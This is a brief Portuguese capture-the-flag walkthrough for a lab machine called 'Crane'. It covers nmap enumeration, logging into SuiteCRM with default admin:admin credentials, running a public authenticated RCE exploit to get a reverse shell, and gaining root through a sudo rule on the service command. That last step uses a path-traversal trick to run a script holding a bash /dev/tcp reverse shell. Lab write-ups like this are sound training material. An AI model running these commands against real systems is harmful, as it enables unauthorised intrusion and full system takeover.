# Crane
> SuiteCRM RCE + sudo service

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

SuiteCRM identificado na porta 80.

## Exploração

Credenciais padrão `admin:admin` funcionam. SuiteCRM versão vulnerável a RCE autenticado:

```
searchsploit suitecrm
```

Upload de webshell via módulo de relatórios ou exploit público:

```
python3 exploit.py -u http://<IP> --user admin --pass admin --lhost <IP> --lport <PORTA>
```

Reverse shell como www-data.

## Escalada de Privilégio

```
sudo -l
```

```
(root) NOPASSWD: /usr/sbin/service
```

Execução de serviço controlável:

```
TF=$(mktemp).sh
echo '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/<PORTA> 0>&1' > $TF
chmod +x $TF
sudo service ../../tmp/$(basename $TF) start
```

Root obtido.
